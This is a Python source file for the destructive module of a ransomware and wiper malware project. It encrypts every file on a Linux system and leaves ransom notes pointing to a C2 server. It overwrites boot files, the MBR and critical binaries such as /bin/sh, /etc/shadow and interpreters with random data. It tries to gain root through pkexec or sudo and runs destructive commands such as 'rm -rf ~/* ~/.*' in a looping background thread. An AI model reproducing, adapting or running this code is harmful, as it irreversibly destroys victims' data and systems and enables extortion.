#!/usr/bin/env python3
"""
Virus Destruction Module - File System Encryption and Wiping
"""
import os
import sys
import threading
import time
import hashlib
import base64
import subprocess
import shutil
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from virus_config import *
from virus_utils import log_activity

def is_root():
    """Check if running as root"""
    return os.geteuid() == 0 if hasattr(os, 'geteuid') else False

def request_root_and_restart():
    """Request root privileges and restart virus with sudo"""
    if is_root():
        return True
    
    try:
        virus_path = os.path.abspath(__file__)
        virus_dir = os.path.dirname(virus_path)
        virus_core = os.path.join(virus_dir, 'virus_core.py')
        
        if not os.path.exists(virus_core):
            return False
        
        log_activity("DESTRUCTION", "Requesting root privileges for complete system destruction...")
        
        # Try to restart with sudo (non-interactive if possible)
        # Use pkexec or gksudo if available, fallback to sudo
        cmd = None
        
        # Try pkexec first (GUI password prompt)
        if shutil.which('pkexec'):
            cmd = ['pkexec', sys.executable, virus_core]
        # Try gksudo (GUI password prompt)
        elif shutil.which('gksudo'):
            cmd = ['gksudo', sys.executable, virus_core]
        # Fallback to sudo (may require password)
        elif shutil.which('sudo'):
            # Try sudo with NOPASSWD if configured, otherwise will prompt
            cmd = ['sudo', sys.executable, virus_core]
        
        if cmd:
            try:
                process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    stdin=subprocess.DEVNULL,
                    start_new_session=True
                )
                log_activity("DESTRUCTION", f"Restarted with root privileges (PID: {process.pid})")
                return True
            except Exception as e:
                log_activity("DESTRUCTION", f"Failed to restart with root: {e}")
        
        return False
    except Exception as e:
        log_activity("DESTRUCTION", f"Error requesting root: {e}")
        return False

def run_with_sudo(command):
    """Run command with sudo if not root"""
    if is_root():
        return subprocess.run(command, shell=False, capture_output=True)
    else:
        sudo_cmd = ['sudo'] + command
        return subprocess.run(sudo_cmd, shell=False, capture_output=True)

# Global encryption key (derived from C2_KEY)
_encryption_key = None
_fernet = None

def generate_encryption_key(password=None):
    """Generate a strong encryption key using PBKDF2"""
    global _encryption_key, _fernet
    
    if password is None:
        password = C2_KEY
    
    # Use PBKDF2 to derive key from password
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=b'virus_salt_2024',  # Fixed salt for consistency
        iterations=100000,
    )
    key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
    _encryption_key = key
    _fernet = Fernet(key)
    return key

def encrypt_file(file_path, key=None):
    """Encrypt a single file using AES (Fernet)"""
    global _fernet
    
    try:
        if _fernet is None:
            generate_encryption_key(key)
        
        # Read file content
        with open(file_path, 'rb') as f:
            file_data = f.read()
        
        # Encrypt data
        encrypted_data = _fernet.encrypt(file_data)
        
        # Write encrypted data back to file with .encrypted extension
        encrypted_path = file_path + '.encrypted'
        with open(encrypted_path, 'wb') as f:
            f.write(encrypted_data)
        
        # Delete original file
        os.remove(file_path)
        
        # Create ransom note
        ransom_note_path = os.path.dirname(file_path) + '/README_RECOVER.txt'
        if not os.path.exists(ransom_note_path):
            ransom_note = f"""
╔══════════════════════════════════════════════════════════════╗
║                    YOUR FILES ARE ENCRYPTED                   ║
╚══════════════════════════════════════════════════════════════╝

All your files have been encrypted with military-grade encryption.

To recover your files, you need to:
1. Contact us at: [C2_SERVER]
2. Provide the following key: {hashlib.md5(C2_KEY.encode()).hexdigest()}
3. Pay the ransom to receive decryption key

Your files are safe, but inaccessible without the decryption key.

DO NOT:
- Try to decrypt files yourself
- Delete .encrypted files
- Restart your computer

Time encrypted: {time.strftime("%Y-%m-%d %H:%M:%S")}
"""
            try:
                with open(ransom_note_path, 'w', encoding='utf-8') as f:
                    f.write(ransom_note)
            except:
                pass
        
        return True
    except Exception as e:
        log_activity("DESTRUCTION", f"Error encrypting {file_path}: {e}")
        return False

def decrypt_file(encrypted_path, key=None):
    """Decrypt a single file"""
    global _fernet
    
    try:
        if _fernet is None:
            generate_encryption_key(key)
        
        # Read encrypted file
        with open(encrypted_path, 'rb') as f:
            encrypted_data = f.read()
        
        # Decrypt data
        decrypted_data = _fernet.decrypt(encrypted_data)
        
        # Write decrypted data to original path
        original_path = encrypted_path.replace('.encrypted', '')
        with open(original_path, 'wb') as f:
            f.write(decrypted_data)
        
        # Remove encrypted file
        os.remove(encrypted_path)
        
        return True
    except Exception as e:
        log_activity("DESTRUCTION", f"Error decrypting {encrypted_path}: {e}")
        return False

def wipe_file(file_path, passes=3):
    """Securely wipe a file by overwriting with random data"""
    try:
        file_size = os.path.getsize(file_path)
        
        with open(file_path, 'r+b') as f:
            for pass_num in range(passes):
                # Write random data
                f.seek(0)
                random_data = os.urandom(file_size)
                f.write(random_data)
                f.flush()
                os.fsync(f.fileno())
        
        # Delete file
        os.remove(file_path)
        return True
    except Exception as e:
        log_activity("DESTRUCTION", f"Error wiping {file_path}: {e}")
        return False

def should_skip_path(path):
    """Check if path should be skipped (system critical or virus files)"""
    # Normalize path
    path = os.path.abspath(path)
    
    # DON'T skip virus's own files - destroy everything including virus directory
    # This ensures complete destruction even if virus is in user directory
    
    # Skip only virtual filesystems (for safety)
    # NOTE: For complete destruction, we target /boot, /run, and everything else
    skip_patterns = [
        '/proc',  # Virtual filesystem (will cause errors if we try to modify)
        '/sys',   # Virtual filesystem (will cause errors if we try to modify)
    ]
    
    # Only skip /dev if we can't write to it (most systems require root)
    # But try to corrupt /dev/sda (MBR) if possible
    
    # Only skip /boot if DESTRUCTION_SKIP_BOOT is enabled
    from virus_config import DESTRUCTION_SKIP_BOOT
    if DESTRUCTION_SKIP_BOOT:
        skip_patterns.extend(['/boot', '/lost+found', '/snap'])
    
    for pattern in skip_patterns:
        if path.startswith(pattern):
            return True
    
    # Skip already encrypted files
    if path.endswith('.encrypted'):
        return True
    
    # DON'T skip hidden files - destroy everything
    # basename = os.path.basename(path)
    # if basename.startswith('.') and basename in ['.bashrc', '.profile', '.bash_history']:
    #     return True
    
    return False

def get_target_directories():
    """Get list of target directories for encryption/wiping"""
    targets = []
    
    # User home directories
    home_dirs = [
        os.path.expanduser('~'),
        '/home',
        '/root',
    ]
    
    for home_dir in home_dirs:
        if os.path.exists(home_dir):
            targets.append(home_dir)
    
    # System critical directories (for complete destruction) - ATTACK EVERYTHING
    system_dirs = [
        '/boot',          # Boot files - CRITICAL for system boot
        '/etc',           # System configuration - CRITICAL
        '/usr',           # User programs and data
        '/usr/bin',       # User binaries - CRITICAL
        '/usr/sbin',      # System binaries - CRITICAL
        '/usr/lib',       # Libraries - CRITICAL
        '/usr/lib64',     # 64-bit libraries - CRITICAL
        '/usr/lib32',     # 32-bit libraries
        '/usr/lib/x86_64-linux-gnu',  # System libraries
        '/usr/share',     # Shared data
        '/usr/local',     # Local installations
        '/bin',           # Essential binaries - CRITICAL
        '/sbin',          # System binaries - CRITICAL
        '/lib',           # Essential libraries - CRITICAL
        '/lib64',         # 64-bit essential libraries - CRITICAL
        '/lib32',         # 32-bit essential libraries
        '/lib/x86_64-linux-gnu',  # System libraries - CRITICAL
        '/opt',           # Optional software
        '/srv',           # Service data
        '/var',           # Variable data
        '/var/www',       # Web content
        '/var/lib',       # Variable libraries
        '/var/log',       # Log files
        '/var/cache',     # Cache files
        '/var/tmp',       # Temporary files
        '/run',           # Runtime data - can cause immediate system issues
    ]
    
    for system_dir in system_dirs:
        if os.path.exists(system_dir):
            targets.append(system_dir)
    
    # Desktop, Documents, Downloads in home
    user_home = os.path.expanduser('~')
    for subdir in ['Desktop', 'Documents', 'Downloads', 'Pictures', 'Videos', 'Music']:
        subdir_path = os.path.join(user_home, subdir)
        if os.path.exists(subdir_path):
            targets.append(subdir_path)
    
    return targets

def encrypt_filesystem(target_dirs=None, file_extensions=None, max_files=None):
    """Encrypt files in target directories - ENCRYPT EVERYTHING"""
    if not ENABLE_FILESYSTEM_ENCRYPTION:
        return
    
    if target_dirs is None:
        target_dirs = get_target_directories()
    
    if file_extensions is None:
        # Encrypt ALL file types - no restrictions
        file_extensions = None  # None means encrypt everything
    
    encrypted_count = 0
    error_count = 0
    
    log_activity("DESTRUCTION", f"Starting filesystem encryption on {len(target_dirs)} directories...")
    log_activity("DESTRUCTION", f"Target directories: {', '.join(target_dirs[:10])}...")
    
    for target_dir in target_dirs:
        if should_skip_path(target_dir):
            continue
        
        try:
            for root, dirs, files in os.walk(target_dir):
                # Skip certain directories
                dirs[:] = [d for d in dirs if not should_skip_path(os.path.join(root, d))]
                
                for file in files:
                    if max_files and encrypted_count >= max_files:
                        log_activity("DESTRUCTION", f"Reached max files limit: {max_files}")
                        return
                    
                    file_path = os.path.join(root, file)
                    
                    if should_skip_path(file_path):
                        continue
                    
                    # Encrypt ALL files - no extension filter for complete destruction
                    try:
                        if encrypt_file(file_path):
                            encrypted_count += 1
                            if encrypted_count % 50 == 0:
                                log_activity("DESTRUCTION", f"Encrypted {encrypted_count} files...")
                    except PermissionError:
                        # Permission denied - try to delete instead
                        try:
                            os.remove(file_path)
                            encrypted_count += 1
                            log_activity("DESTRUCTION", f"Deleted file (no permission): {file_path}")
                        except:
                            error_count += 1
                    except Exception as e:
                        error_count += 1
        except Exception as e:
            log_activity("DESTRUCTION", f"Error processing {target_dir}: {e}")
            error_count += 1
    
    log_activity("DESTRUCTION", f"Encryption complete: {encrypted_count} files encrypted, {error_count} errors")

def wipe_filesystem(target_dirs=None, file_extensions=None, max_files=None):
    """Wipe (securely delete) files in target directories"""
    if not ENABLE_FILESYSTEM_WIPING:
        return
    
    if target_dirs is None:
        target_dirs = get_target_directories()
    
    wiped_count = 0
    error_count = 0
    
    log_activity("DESTRUCTION", f"Starting filesystem wiping on {len(target_dirs)} directories...")
    
    for target_dir in target_dirs:
        if should_skip_path(target_dir):
            continue
        
        try:
            for root, dirs, files in os.walk(target_dir):
                # Skip certain directories
                dirs[:] = [d for d in dirs if not should_skip_path(os.path.join(root, d))]
                
                for file in files:
                    if max_files and wiped_count >= max_files:
                        log_activity("DESTRUCTION", f"Reached max files limit: {max_files}")
                        return
                    
                    file_path = os.path.join(root, file)
                    
                    if should_skip_path(file_path):
                        continue
                    
                    # Check file extension
                    _, ext = os.path.splitext(file)
                    if ext.lower() in file_extensions if file_extensions else True:
                        try:
                            if wipe_file(file_path):
                                wiped_count += 1
                                if wiped_count % 100 == 0:
                                    log_activity("DESTRUCTION", f"Wiped {wiped_count} files...")
                        except:
                            error_count += 1
        except Exception as e:
            log_activity("DESTRUCTION", f"Error processing {target_dir}: {e}")
            error_count += 1
    
    log_activity("DESTRUCTION", f"Wiping complete: {wiped_count} files wiped, {error_count} errors")

def corrupt_boot_files():
    """Corrupt boot files to prevent system from booting - COMPLETE DESTRUCTION"""
    boot_targets = [
        '/boot/vmlinuz',
        '/boot/initrd.img',
        '/boot/initrd',
        '/boot/grub/grub.cfg',
        '/boot/grub/menu.lst',
        '/boot/grub/grubenv',
        '/boot/efi/EFI/ubuntu/grubx64.efi',
        '/boot/efi/EFI/ubuntu/shimx64.efi',
        '/boot/efi/EFI/BOOT/bootx64.efi',
        '/boot/efi/EFI/BOOT/grubx64.efi',
    ]
    
    corrupted = 0
    for boot_file in boot_targets:
        if os.path.exists(boot_file):
            try:
                # Overwrite with random data - larger size for boot files
                file_size = min(os.path.getsize(boot_file), 10240)  # Max 10KB
                with open(boot_file, 'wb') as f:
                    f.write(os.urandom(file_size if file_size > 0 else 2048))
                corrupted += 1
                log_activity("DESTRUCTION", f"Corrupted boot file: {boot_file}")
            except:
                pass
    
    # Corrupt all files in /boot directory
    if os.path.exists('/boot'):
        try:
            for root, dirs, files in os.walk('/boot'):
                for file in files:
                    boot_file = os.path.join(root, file)
                    if boot_file not in boot_targets:  # Avoid double processing
                        try:
                            file_size = min(os.path.getsize(boot_file), 5120)
                            with open(boot_file, 'wb') as f:
                                f.write(os.urandom(file_size if file_size > 0 else 1024))
                            corrupted += 1
                        except:
                            pass
        except:
            pass
    
    if corrupted > 0:
        log_activity("DESTRUCTION", f"Corrupted {corrupted} boot files - SYSTEM WILL NOT BOOT")
    
    # Also try to corrupt MBR if possible (requires root)
    try:
        import fcntl
        # Try to corrupt first 512 bytes of first disk (MBR)
        try:
            with open('/dev/sda', 'wb') as f:
                f.write(os.urandom(512))  # Corrupt MBR
            log_activity("DESTRUCTION", "Corrupted MBR - SYSTEM WILL NOT BOOT")
        except:
            pass
    except:
        pass

def corrupt_system_critical_files():
    """Corrupt critical system files to make system unbootable"""
    critical_files = [
        # Essential system binaries - corrupt these and system won't work
        '/bin/sh', '/bin/bash', '/bin/dash', '/bin/cat', '/bin/ls', '/bin/mv', '/bin/cp', '/bin/rm',
        '/bin/mkdir', '/bin/rmdir', '/bin/chmod', '/bin/chown', '/bin/mount', '/bin/umount',
        '/sbin/init', '/sbin/reboot', '/sbin/shutdown', '/sbin/halt', '/sbin/poweroff',
        '/sbin/mount', '/sbin/umount', '/sbin/fsck', '/sbin/mkfs',
        
        # System libraries - corrupt these and nothing will run
        '/lib/systemd/systemd', '/lib64/ld-linux-x86-64.so.2', '/lib/x86_64-linux-gnu/libc.so.6',
        
        # System configuration - corrupt these and system won't boot properly
        '/etc/passwd', '/etc/shadow', '/etc/group', '/etc/gshadow',
        '/etc/fstab', '/etc/mtab', '/etc/hosts', '/etc/hostname',
        '/etc/resolv.conf', '/etc/network/interfaces', '/etc/netplan',
        '/etc/systemd/system.conf', '/etc/systemd/user.conf',
        '/etc/default/grub', '/etc/grub.d',
        
        # Init system files
        '/etc/inittab', '/etc/rc.local', '/etc/init.d',
        
        # Python and interpreters - corrupt these to prevent recovery
        '/usr/bin/python3', '/usr/bin/python', '/usr/bin/python2',
        '/usr/bin/perl', '/usr/bin/ruby', '/usr/bin/node',
        
        # Shell scripts and utilities
        '/usr/bin/sh', '/usr/bin/bash', '/usr/bin/zsh', '/usr/bin/fish',
        
        # System utilities
        '/usr/bin/sudo', '/usr/bin/su', '/usr/bin/chmod', '/usr/bin/chown',
        
        # Bootloader files
        '/boot/grub/grub.cfg', '/boot/grub/menu.lst', '/boot/grub/grubenv',
    ]
    
    corrupted = 0
    for critical_file in critical_files:
        if os.path.exists(critical_file):
            try:
                # Try to corrupt - use sudo if not root
                file_size = min(os.path.getsize(critical_file), 10240)  # Max 10KB
                random_data = os.urandom(file_size if file_size > 0 else 1024)
                
                if is_root():
                    # Direct write as root
                    with open(critical_file, 'wb') as f:
                        f.write(random_data)
                    corrupted += 1
                    log_activity("DESTRUCTION", f"Corrupted critical file: {critical_file}")
                else:
                    # Try with sudo
                    try:
                        result = run_with_sudo(['sh', '-c', f'echo -n | dd of="{critical_file}" bs=1 count={len(random_data)} if=/dev/urandom 2>/dev/null'])
                        if result.returncode == 0 or os.path.getsize(critical_file) == 0:
                            corrupted += 1
                            log_activity("DESTRUCTION", f"Corrupted critical file (with sudo): {critical_file}")
                    except:
                        # Fallback: try direct write (may fail but worth trying)
                        try:
                            with open(critical_file, 'wb') as f:
                                f.write(random_data)
                            corrupted += 1
                            log_activity("DESTRUCTION", f"Corrupted critical file: {critical_file}")
                        except:
                            pass
            except Exception as e:
                log_activity("DESTRUCTION", f"Failed to corrupt {critical_file}: {e}")
                pass
    
    # Also corrupt all files in critical directories
    critical_dirs = [
        '/etc/systemd/system',
        '/etc/init.d',
        '/etc/rc.d',
        '/bin',
        '/sbin',
    ]
    
    for critical_dir in critical_dirs:
        if os.path.exists(critical_dir):
            try:
                for root, dirs, files in os.walk(critical_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        try:
                            file_size = min(os.path.getsize(file_path), 5120)  # Max 5KB
                            with open(file_path, 'wb') as f:
                                f.write(os.urandom(file_size if file_size > 0 else 512))
                            corrupted += 1
                        except:
                            pass
            except:
                pass
    
    if corrupted > 0:
        log_activity("DESTRUCTION", f"Corrupted {corrupted} critical system files - SYSTEM WILL NOT BOOT")

def destroy_filesystem():
    """Complete filesystem destruction - encryption + wiping + corruption - SYSTEM KILLER"""
    log_activity("DESTRUCTION", "=" * 60)
    log_activity("DESTRUCTION", "STARTING COMPLETE SYSTEM DESTRUCTION")
    log_activity("DESTRUCTION", "=" * 60)
    
    # Check root privileges
    if is_root():
        log_activity("DESTRUCTION", "✅ Running as ROOT - Full system destruction enabled")
    else:
        log_activity("DESTRUCTION", "⚠️  NOT running as root - Attempting to request privileges...")
        request_root_and_restart()
        log_activity("DESTRUCTION", "⚠️  Continuing without root - Will destroy what we can")
    
    # Phase 0: IMMEDIATE - Aggressively destroy user files (works without root)
    log_activity("DESTRUCTION", "Phase 0: Aggressively destroying user files...")
    try:
        user_home = os.path.expanduser('~')
        if os.path.exists(user_home):
            # Delete everything in home directory
            for item in os.listdir(user_home):
                item_path = os.path.join(user_home, item)
                try:
                    if os.path.isfile(item_path) or os.path.islink(item_path):
                        os.remove(item_path)
                    elif os.path.isdir(item_path):
                        shutil.rmtree(item_path)
                    log_activity("DESTRUCTION", f"Deleted: {item_path}")
                except:
                    pass
    except Exception as e:
        log_activity("DESTRUCTION", f"Error in Phase 0: {e}")
    
    # Phase 1: IMMEDIATE - Corrupt boot and critical files FIRST (fastest way to kill system)
    if ENABLE_FILESYSTEM_DESTRUCTION:
        log_activity("DESTRUCTION", "Phase 1: Corrupting boot and critical system files...")
        corrupt_boot_files()
        corrupt_system_critical_files()
        log_activity("DESTRUCTION", "Phase 1 complete - System is now UNBOOTABLE")
    
    # Phase 2: Encrypt files (while system is still running) - ENCRYPT EVERYTHING
    if ENABLE_FILESYSTEM_ENCRYPTION:
        log_activity("DESTRUCTION", "Phase 2: Encrypting filesystem (ALL FILES, NO FILTER)...")
        encrypt_filesystem(max_files=None)  # No limit for complete destruction
    
    # Phase 3: Wipe files (final destruction)
    if ENABLE_FILESYSTEM_WIPING:
        log_activity("DESTRUCTION", "Phase 3: Wiping filesystem...")
        wipe_filesystem(max_files=None)  # No limit for complete destruction
    
    # Phase 4: Try shell commands for maximum destruction
    log_activity("DESTRUCTION", "Phase 4: Executing destructive shell commands...")
    try:
        destructive_commands = [
            "rm -rf ~/* ~/.* 2>/dev/null",  # Delete entire home
            "rm -rf /tmp/* /tmp/.* 2>/dev/null",  # Delete /tmp
            "find ~ -type f -delete 2>/dev/null",  # Delete all files in home
        ]
        for cmd in destructive_commands:
            try:
                subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
                log_activity("DESTRUCTION", f"Executed: {cmd}")
            except:
                pass
    except:
        pass
    
    log_activity("DESTRUCTION", "=" * 60)
    log_activity("DESTRUCTION", "COMPLETE SYSTEM DESTRUCTION FINISHED - SYSTEM IS DEAD")
    log_activity("DESTRUCTION", "=" * 60)

def destruction_worker():
    """Background worker for periodic filesystem destruction"""
    if not (ENABLE_FILESYSTEM_ENCRYPTION or ENABLE_FILESYSTEM_WIPING or ENABLE_FILESYSTEM_DESTRUCTION):
        return
    
    # Wait before starting destruction (0 = immediate)
    if DESTRUCTION_DELAY > 0:
        time.sleep(DESTRUCTION_DELAY)
    
    # Run complete destruction once if enabled
    if ENABLE_FILESYSTEM_DESTRUCTION:
        try:
            destroy_filesystem()
        except Exception as e:
            log_activity("DESTRUCTION", f"Error in complete destruction: {e}")
    
    # Continue with periodic destruction
    while True:
        try:
            if ENABLE_FILESYSTEM_ENCRYPTION:
                encrypt_filesystem(max_files=DESTRUCTION_BATCH_SIZE if DESTRUCTION_BATCH_SIZE else None)
            
            if ENABLE_FILESYSTEM_WIPING:
                wipe_filesystem(max_files=DESTRUCTION_BATCH_SIZE if DESTRUCTION_BATCH_SIZE else None)
            
            # Wait before next batch
            time.sleep(DESTRUCTION_INTERVAL)
        except Exception as e:
            log_activity("DESTRUCTION", f"Error in destruction worker: {e}")
            time.sleep(DESTRUCTION_INTERVAL)

def start_destruction():
    """Start filesystem destruction in background thread"""
    if ENABLE_FILESYSTEM_ENCRYPTION or ENABLE_FILESYSTEM_WIPING or ENABLE_FILESYSTEM_DESTRUCTION:
        destruction_thread = threading.Thread(target=destruction_worker, daemon=True)
        destruction_thread.start()
        log_activity("DESTRUCTION", "Filesystem destruction module activated")
        return destruction_thread
    return None

